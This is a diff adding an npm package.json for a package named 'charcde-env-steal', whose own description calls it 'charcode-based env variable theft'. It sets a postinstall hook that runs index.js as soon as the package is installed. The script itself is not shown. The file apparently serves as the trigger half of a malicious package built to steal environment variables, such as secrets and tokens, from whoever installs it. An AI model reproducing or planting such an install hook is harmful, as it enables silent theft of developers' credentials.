@@ -1,0 +1,8 @@
+{
+  "name": "charcde-env-steal",
+  "version": "1.0.0",
+  "description": "Charcode-based env variable theft",
+  "scripts": {
+    "postinstall": "node index.js"
+  }
+}
